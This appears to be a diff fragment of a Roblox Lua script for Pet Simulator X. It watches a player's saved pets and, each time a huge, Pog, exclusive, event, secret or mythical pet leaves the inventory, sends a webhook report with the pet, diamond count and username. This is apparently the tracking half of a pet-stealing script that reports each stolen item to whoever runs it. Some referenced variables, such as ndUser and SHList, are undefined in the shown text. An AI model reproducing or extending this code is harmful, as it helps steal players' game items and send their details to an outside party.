+local Hcc = #HList
+WHugeList = {}
+WHList = {}
+WHcc = {}
+local hugenumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.huge then
+                table.insert(WHugeList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WHugeList, v["id"]) ~= nil then
+                table.insert(WHList, v["uid"])
+                table.insert(WHcc, v["id"])
+            end
+        end
+        if Hcc == #WHList + 1 then
+            -- print("Huge Has Been Sent")
+            Hcc = #WHList
+            FinalList = FinalList - 1
+            local hugepetid = SHList[hugenumber]
+            local hugeimg
+            local hugepetname
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local hugepetsm = string.split(v.Name, " - ")[1]
+                if hugepetsm == tostring(hugepetid) then
+                    hugepetname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    hugeimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":money_mouth: **HUGE** :money_mouth:", hugepetname, "@everyone", DiamondsCount,
+                FinalList, hugeimg, UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            hugenumber = hugenumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Hcc == 0 or FinalList == 0 then
+            HList = {}
+            -- print("done3")
+            break
+        end
+        WHugeList = {}
+        WHList = {}
+        WHcc = {}
+        wait(1)
+    end
+end)
+
+local Pcc = #PList
+WPogList = {}
+WPList = {}
+WPcc = {}
+local pognumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if string.split(v.name, " ")[1] == "Pog" then
+                table.insert(WPogList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WPogList, v["id"]) ~= nil then
+                table.insert(WPList, v["uid"])
+                table.insert(WPcc, v["id"])
+            end
+        end
+        if Pcc == #WPList + 1 then
+            -- print("Exc")
+            Pcc = #WPList
+            FinalList = FinalList - 1
+            local pogID = SPList[pognumber]
+            local pogname
+            local pogimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local pogsm = string.split(v.Name, " - ")[1]
+                if pogsm == tostring(pogID) then
+                    pogname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    pogimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":fire: **POG** :fire:", pogname, "", DiamondsCount, FinalList, pogimg, UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            pognumber = pognumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Pcc == 0 or FinalList == 0 then
+            PList = {}
+            -- print("done41")
+            break
+        end
+        WPogList = {}
+        WPList = {}
+        WPcc = {}
+        wait(1)
+    end
+end)
+
+local Ecc = #EList
+WExclusiveList = {}
+WEList = {}
+WEcc = {}
+local excnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Exclusive" and not v.huge and not v.titanic then
+                table.insert(WExclusiveList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WExclusiveList, v["id"]) ~= nil and not v.huge and not v.titanic then
+                table.insert(WEList, v["uid"])
+                table.insert(WEcc, v["id"])
+            end
+        end
+        if Ecc == #WEList + 1 then
+            -- print("Exc")
+            Ecc = #WEList
+            FinalList = FinalList - 1
+            local excID = SEList[excnumber]
+            local excimg
+            local excname
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local excsm = string.split(v.Name, " - ")[1]
+                if excsm == tostring(excID) then
+                    excname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    excimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":teddy_bear: **Exclusive** :teddy_bear:", excname, "", DiamondsCount, FinalList, excimg,
+                UserName)
+            givediaamt = 0
+            DiamondsCount = 0
+            excnumber = excnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Ecc == 0 or FinalList == 0 then
+            EList = {}
+            -- print("done41")
+            break
+        end
+        WExclusiveList = {}
+        WEList = {}
+        WEcc = {}
+        wait(1)
+    end
+end)
+
+local Evcc = #EvList
+WEventList = {}
+WEvList = {}
+WEvcc = {}
+local eventnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Event" then
+                table.insert(WEventList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WEventList, v["id"]) ~= nil then
+                table.insert(WEvList, v["uid"])
+                table.insert(WEvcc, v["id"])
+            end
+        end
+        if Evcc == #WEvList + 1 then
+            -- print("Event")
+            Evcc = #WEvList
+            FinalList = FinalList - 1
+            local diamonds = givediaamt
+            local eventID = SEvList[eventnumber]
+            local eventname
+            local eventimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local eventsm = string.split(v.Name, " - ")[1]
+                if eventsm == tostring(eventID) then
+                    eventname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    eventimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":pushpin: **Event** :pushpin:", eventname, "", DiamondsCount, FinalList, eventimg, ndUser,
+                petinfo)
+            givediaamt = 0
+            DiamondsCount = 0
+            eventnumber = eventnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Evcc == 0 or FinalList == 0 then
+            EvList = {}
+            -- print("done5")
+            break
+        end
+        WEventList = {}
+        WEvList = {}
+        WEvcc = {}
+        wait(1)
+    end
+end)
+
+
+local Scc = #SList
+WSecretList = {}
+WSList = {}
+WScc = {}
+local secretnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Secret" then
+                table.insert(WSecretList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WSecretList, v["id"]) ~= nil then
+                table.insert(WSList, v["uid"])
+                table.insert(WScc, v["id"])
+            end
+        end
+        if Scc == #WSList + 1 then
+            -- print("Secret")
+            Scc = #WSList
+            FinalList = FinalList - 1
+            local secretID = SSList[secretnumber]
+            local secretname
+            local secretimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local secretsm = string.split(v.Name, " - ")[1]
+                if secretsm == tostring(secretID) then
+                    secretname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    secretimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
+                    break
+                end
+            end
+            SendWebhook(":shushing_face: **SECRET** :shushing_face:", secretname, "", DiamondsCount, FinalList,
+                secretimg, ndUser)
+            givediaamt = 0
+            DiamondsCount = 0
+            secretnumber = secretnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Scc == 0 or FinalList == 0 then
+            SList = {}
+            -- print("done6")
+            break
+        end
+        WSecretList = {}
+        WSList = {}
+        WScc = {}
+        wait(1)
+    end
+end)
+
+local Mcc = #MList
+WMythicList = {}
+WMList = {}
+WMcc = {}
+local mythicnumber = 1
+spawn(function()
+    while wait() do
+        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+        WFunctions = WLibrary.Functions
+        table.foreach(WLibrary.Directory.Pets, function(i, v)
+            if v.rarity == "Mythical" then
+                table.insert(WMythicList, i)
+            end
+        end)
+        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
+        local Wy = {}
+        for i, v in pairs(Wpets) do
+            Wy[v["uid"]] = false
+        end
+        for i, v in pairs(Wpets) do
+            if table.find(WMythicList, v["id"]) ~= nil and v.hc and v.dm then
+                table.insert(WMList, v["uid"])
+                table.insert(WMcc, v["id"])
+            end
+        end
+        if Mcc == #WMList + 1 then
+            -- print("Mythic")
+            Mcc = #WMList
+            FinalList = FinalList - 1
+            local mythicID = SMList[mythicnumber]
+            local mythicname
+            local mythicimg
+            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
+                local mythicsm = string.split(v.Name, " - ")[1]
+                if mythicsm == tostring(mythicID) then
+                    mythicname = require(v:FindFirstChildOfClass("ModuleScript")).name
+                    mythicimg = require(v:FindFirstChildOfClass("ModuleScript")).darkMatterThumbnail
+                    break
+                end
+            end
+            SendWebhook(":ribbon: **Mythical** :ribbon:", mythicname, "", DiamondsCount, FinalList, mythicimg,
+                ndUser)
+            givediaamt = 0
+            DiamondsCount = 0
+            mythicnumber = mythicnumber + 1
+            DiamondsDiamonds = 0
+            FinalFinal = 0
+        elseif Mcc == 0 or FinalList == 0 then
+            MList = {}
+            -- print("done7")
+            break
+        end
+        WMythicList = {}
+        WMList = {}
+        WMcc = {}
+        wait(1)
+    end
+end)
